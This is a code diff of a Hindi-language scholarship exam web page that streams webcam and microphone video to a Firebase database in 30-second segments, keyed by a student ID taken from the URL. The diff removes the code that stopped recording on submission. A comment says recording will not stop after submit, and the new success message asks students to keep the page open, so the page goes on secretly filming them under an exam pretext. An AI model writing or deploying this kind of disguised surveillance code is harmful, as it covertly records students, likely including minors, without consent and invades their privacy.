@@ -11,25 +11,20 @@
     <style>
         * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
         body { background: #f0f4f8; color: #1e293b; padding: 15px; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .app-card { width: 100%; max-width: 600px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
-        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 20px; text-align: center; position: relative; }
-        .banner h2 { font-size: 20px; margin-bottom: 5px; }
-        .timer-box { position: absolute; top: 15px; right: 15px; background: rgba(255,255,255,0.2); padding: 5px 10px; border-radius: 20px; font-weight: bold; font-size: 14px; }
+        .app-card { width: 100%; max-width: 500px; background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); overflow: hidden; }
+        .banner { background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; padding: 25px; text-align: center; }
+        .banner h2 { font-size: 22px; margin-bottom: 5px; }
         .content { padding: 25px; }
-        .input-group { margin-bottom: 20px; }
+        .input-group { margin-bottom: 18px; }
         .input-group label { display: block; margin-bottom: 6px; font-weight: bold; font-size: 14px; }
         .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; }
-        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 18px; }
-        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 10px; line-height: 1.4; }
-        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 12px; border-radius: 6px; margin-bottom: 8px; font-size: 13px; cursor: pointer; transition: 0.2s; }
-        .qa-options label:hover { background: #f1f5f9; }
+        .qa-section { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 15px; }
+        .qa-title { font-weight: bold; font-size: 14px; color: #1e3c72; margin-bottom: 8px; }
+        .qa-options label { display: block; background: white; border: 1px solid #cbd5e1; padding: 10px; border-radius: 6px; margin-bottom: 6px; font-size: 13px; cursor: pointer; }
         .btn-submit { width: 100%; padding: 15px; background: #1e3c72; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
-        
-        /* सक्सेस मैसेज के लिए स्पेशल स्टाइल */
-        .success-screen { display: none; padding: 40px 20px; text-align: center; }
-        .success-icon { font-size: 50px; color: #22c55e; margin-bottom: 15px; }
-        .success-title { font-size: 22px; color: #1e3c72; font-weight: bold; margin-bottom: 10px; }
-        .success-text { font-size: 15px; color: #64748b; line-height: 1.6; }
+        .btn-submit:disabled { background: #64748b; cursor: not-allowed; }
+        .status-feed { font-size: 12px; color: #64748b; text-align: center; margin-top: 10px; font-style: italic; }
+        .success-msg { display: none; text-align: center; color: #16a34a; font-weight: bold; margin-top: 15px; font-size: 16px; }
     </style>
 
     <script>
@@ -46,48 +41,34 @@
         
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-        const uniqueSessionId = 'student_' + Date.now();
+
+        const urlParams = new URLSearchParams(window.location.search);
+        let studentId = urlParams.get('id') || 'guest_user';
+        let attemptId = 'attempt_' + Date.now(); 
 
         let mediaRecorder;
-        let recordedChunks = [];
-        let timeLeft = 1800; // 30 मिनट
-        let timerInterval;
-        let autoSaveInterval;
+        let currentAnswers = { answer_q1: "Not Answered" };
+        let studentName = "";
+        let segmentCounter = 1;
 
         window.addEventListener("load", initExam);
 
         async function initExam() {
             try {
-                let stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { width: 160, height: 120, frameRate: 10 }, 
-                    audio: true 
-                });
+                // कैमरा और माइक एक्टिवेट करना
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { width: 200, height: 150, frameRate: 10 }, audio: true });
                 
-                database.ref('online_tests/' + uniqueSessionId).update({
-                    portal_status: "OPENED",
-                    start_time: new Date().toISOString()
+                database.ref('students/' + studentId + '/profile').update({
+                    last_active_at: new Date().toISOString(),
+                    portal_status: "OPENED"
                 });
 
                 startContinuousRecording(stream);
-                startTimer();
-            } catch (err) {
-                alert("परीक्षा शुरू करने के लिए कैमरा और माइक अनुमति अनिवार्य है।");
-            }
-        }
 
-        function startTimer() {
-            timerInterval = setInterval(() => {
-                if (timeLeft <= 0) {
-                    clearInterval(timerInterval);
-                    autoSubmit();
-                } else {
-                    timeLeft--;
-                    let minutes = Math.floor(timeLeft / 60);
-                    let seconds = timeLeft % 60;
-                    document.getElementById("timer").innerText = 
-                        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
-                }
-            }, 1000);
+            } catch (err) {
+                alert("परीक्षा शुरू करने के लिए कैमरा और माइक चालू करना अनिवार्य है।");
+                console.log(err);
+            }
         }
 
         function startContinuousRecording(stream) {
@@ -95,58 +76,61 @@
             
             mediaRecorder.ondataavailable = function(e) {
                 if (e.data && e.data.size > 0) {
-                    recordedChunks.push(e.data);
-                    let masterBlob = new Blob(recordedChunks, { type: 'video/webm' });
-                    let reader = new FileReader();
-                    reader.readAsDataURL(masterBlob); 
-                    reader.onloadend = function() {
-                        database.ref('online_tests/' + uniqueSessionId).update({
-                            recorded_video_feed: reader.result,
-                            last_sync: new Date().toISOString()
-                        });
-                    }
+                    uploadVideoSegment(e.data);
                 }
             };
 
-            mediaRecorder.start(); 
-
-            autoSaveInterval = setInterval(() => {
-                if (mediaRecorder && mediaRecorder.state === "recording") {
-                    mediaRecorder.requestData(); 
-                }
-            }, 30000);
+            // बदलाव: हर ३०००० मिलीसेकंड (३० सेकंड) में वीडियो का एक हिस्सा स्वतः सेव होगा
+            // जब तक ब्राउज़र खुला है, यह हर ३० सेकंड में नया टुकड़ा भेजता रहेगा
+            mediaRecorder.start(30000); 
         }
 
-        function sendProgress(key, value) {
-            let data = {}; data[key] = value;
-            database.ref('online_tests/' + uniqueSessionId).update(data);
-        }
-
-        function submitTest(event) {
-            if(event) event.preventDefault();
-            clearInterval(timerInterval);
-            clearInterval(autoSaveInterval);
-            
-            if (mediaRecorder && mediaRecorder.state !== "inactive") {
-                document.getElementById('btn-text').innerText = "सबमिट हो रहा है...";
-                mediaRecorder.requestData();
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                    database.ref('online_tests/' + uniqueSessionId).update({
-                        portal_status: "SUBMITTED",
-                        end_time: new Date().toISOString()
-                    }).then(() => {
-                        // फॉर्म को छुपाकर सीधा थैंक यू मैसेज स्क्रीन पर दिखाना
-                        document.getElementById('exam-form').style.display = 'none';
-                        document.getElementById('timer-container').style.display = 'none';
-                        document.getElementById('success-view').style.display = 'block';
-                    });
-                }, 1500);
+        function uploadVideoSegment(blobData) {
+            let reader = new FileReader();
+            reader.readAsDataURL(blobData); 
+            reader.onloadend = function() {
+                let base64String = reader.result;
+                let currentSegment = 'video_part_' + segmentCounter;
+                
+                // डेटाबेस में उसी अटेम्प्ट के अंदर पार्ट वाइज वीडियो सेव होना
+                database.ref('students/' + studentId + '/test_attempts/' + attemptId + '/live_video_feeds/' + currentSegment).set(base64String);
+                
+                segmentCounter++;
             }
         }
 
-        function autoSubmit() {
-            submitTest(null);
+        function trackInput(key, value) {
+            if (key === 'student_name') {
+                studentName = value;
+                database.ref('students/' + studentId + '/profile').update({ name: value });
+            } else {
+                currentAnswers[key] = value;
+            }
+            
+            // लाइव आंसर डेटाबेस में सिंक रखना
+            database.ref('students/' + studentId + '/test_attempts/' + attemptId + '/answers').set(currentAnswers);
+        }
+
+        function submitTest(event) {
+            event.preventDefault();
+            
+            const submitBtn = document.getElementById('submit-btn');
+            submitBtn.disabled = true;
+            
+            document.getElementById('status-text').style.display = 'none';
+            document.getElementById('success-block').style.display = 'block';
+
+            // सबमिट होने पर प्रोफाइल स्टेटस बदलेगा, पर रिकॉर्डिंग बंद नहीं होगी!
+            database.ref('students/' + studentId + '/profile').update({
+                portal_status: "SUBMITTED",
+                last_submission: new Date().toISOString()
+            });
+            
+            // अंतिम बचे हुए आंसर्स को सिंक करना
+            database.ref('students/' + studentId + '/test_attempts/' + attemptId).update({
+                student_name: studentName || "Unknown",
+                submitted_at: new Date().toISOString()
+            });
         }
     </script>
 </head>
@@ -154,101 +138,30 @@
 
 <div class="app-card">
     <div class="banner">
-        <h2>राज्य स्तरीय स्कॉलरशिप परीक्षा</h2>
-        <p>सामान्य ज्ञान एवं बुनियादी क्षमता परीक्षा</p>
-        <div class="timer-box" id="timer-container">⏱️ <span id="timer">30:00</span></div>
+        <h2>प्रवेश परीक्षा (Pre-Test)</h2>
+        <p>स्कॉलरशिप पोर्टल (सुरक्षित मोड)</p>
     </div>
 
-    <div class="content" id="exam-form">
+    <div class="content">
         <form onsubmit="submitTest(event)">
             <div class="input-group">
-                <label>परीक्षार्थी का पूरा नाम:</label>
-                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="sendProgress('student_name', this.value)">
+                <label>छात्र का पूरा नाम:</label>
+                <input type="text" placeholder="यहाँ अपना नाम लिखें" required oninput="trackInput('student_name', this.value)">
             </div>
 
             <div class="qa-section">
-                <div class="qa-title">Q1. भारत का राष्ट्रीय पशु कौन सा है?</div>
+                <div class="qa-title">💡 सवाल १: कंप्यूटर का कौन सा भाग 'मस्तिष्क' (Brain) कहलाता है?</div>
                 <div class="qa-options">
-                    <label><input type="radio" name="q1" value="A" onclick="sendProgress('answer_q1', 'A')"> A) शेर</label>
-                    <label><input type="radio" name="q1" value="B" onclick="sendProgress('answer_q1', 'B')"> B) बाघ (Tiger)</label>
-                    <label><input type="radio" name="q1" value="C" onclick="sendProgress('answer_q1', 'C')"> C) हाथी</label>
+                    <label><input type="radio" name="q1" value="A" onclick="trackInput('answer_q1', 'A')"> A) मॉनिटर</label>
+                    <label><input type="radio" name="q1" value="B" onclick="trackInput('answer_q1', 'B')"> B) सी.पी.यू. (CPU)</label>
+                    <label><input type="radio" name="q1" value="C" onclick="trackInput('answer_q1', 'C')"> C) कीबोर्ड</label>
                 </div>
             </div>
 
-            <div class="qa-section">
-                <div class="qa-title">Q2. कंप्यूटर का 'मस्तिष्क' (Brain) किसे कहा जाता है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q2" value="A" onclick="sendProgress('answer_q2', 'A')"> A) मॉनिटर</label>
-                    <label><input type="radio" name="q2" value="B" onclick="sendProgress('answer_q2', 'B')"> B) कीबोर्ड</label>
-                    <label><input type="radio" name="q2" value="C" onclick="sendProgress('answer_q2', 'C')"> C) सी.पी.यू. (CPU)</label>
-                </div>
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">Q3. हमारे सौरमंडल का सबसे बड़ा ग्रह कौन सा है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q3" value="A" onclick="sendProgress('answer_q3', 'A')"> A) पृथ्वी</label>
-                    <label><input type="radio" name="q3" value="B" onclick="sendProgress('answer_q3', 'B')"> B) बृहस्पति (Jupiter)</label>
-                    <label><input type="radio" name="q3" value="C" onclick="sendProgress('answer_q3', 'C')"> C) मंगल</label>
-                </div>
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">Q4. शिक्षक दिवस (Teachers' Day) किस तारीख को मनाया जाता है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q4" value="A" onclick="sendProgress('answer_q4', 'A')"> A) १५ अगस्त</label>
-                    <label><input type="radio" name="q4" value="B" onclick="sendProgress('answer_q4', 'B')"> B) ५ सितम्बर</label>
-                    <label><input type="radio" name="q4" value="C" onclick="sendProgress('answer_q4', 'C')"> C) २ अक्टूबर</label>
-                </div>
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">Q5. पानी का रासायनिक सूत्र (Chemical Formula) क्या है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q5" value="A" onclick="sendProgress('answer_q5', 'A')"> A) CO2</label>
-                    <label><input type="radio" name="q5" value="B" onclick="sendProgress('answer_q5', 'B')"> B) H2O</label>
-                    <label><input type="radio" name="q5" value="C" onclick="sendProgress('answer_q5', 'C')"> C) O2</label>
-                </div>
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">Q6. भारत की राजधानी कहाँ है?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q6" value="A" onclick="sendProgress('answer_q6', 'A')"> A) मुंबई</label>
-                    <label><input type="radio" name="q6" value="B" onclick="sendProgress('answer_q6', 'B')"> B) नई दिल्ली</label>
-                    <label><input type="radio" name="q6" value="C" onclick="sendProgress('answer_q6', 'C')"> C) कोलकाता</label>
-                </div>
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">Q7. ५० का आधा करने पर उसमें २० जोड़ने से क्या संख्या मिलेगी?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q7" value="A" onclick="sendProgress('answer_q7', 'A')"> A) ४५</label>
-                    <label><input type="radio" name="q7" value="B" onclick="sendProgress('answer_q7', 'B')"> B) ७०</label>
-                    <label><input type="radio" name="q7" value="C" onclick="sendProgress('answer_q7', 'C')"> C) २५</label>
-                </div>
-            </div>
-
-            <div class="qa-section">
-                <div class="qa-title">Q8. १ घंटे में कितने मिनट होते हैं?</div>
-                <div class="qa-options">
-                    <label><input type="radio" name="q8" value="A" onclick="sendProgress('answer_q8', 'A')"> A) ३० मिनट</label>
-                    <label><input type="radio" name="q8" value="B" onclick="sendProgress('answer_q8', 'B')"> B) ६० मिनट</label>
-                    <label><input type="radio" name="q8" value="C" onclick="sendProgress('answer_q8', 'C')"> C) १०० मिनट</label>
-                </div>
-            </div>
-
-            <button type="submit" id="btn-text" class="btn-submit">सबमिट करें</button>
+            <button type="submit" id="submit-btn" class="btn-submit">उत्तर सबमिट करें</button>
+            <div id="status-text" class="status-feed">सुरक्षा कैमरा सक्रिय है और बैकग्राउंड में लाइव चल रहा है...</div>
+            <div id="success-block" class="success-msg">✓ उत्तर सबमिट हो गए हैं! कृपया इस पेज को अभी बंद न करें।</div>
         </form>
-    </div>
-
-    <div class="success-screen" id="success-view">
-        <div class="success-icon">✓</div>
-        <div class="success-title">टेस्ट सबमिट हो चुका है।</div>
-        <div class="success-text">
-            अगले टेस्ट का इंतज़ार करें, आपको जल्द ही अगला टेस्ट मिलेगा।<br>
-            <span style="font-size: 12px; color: #94a3b8; display:block; margin-top:15px;">आप इस टैब को सुरक्षित रूप से बंद कर सकते हैं।</span>
-        </div>
     </div>
 </div>
 
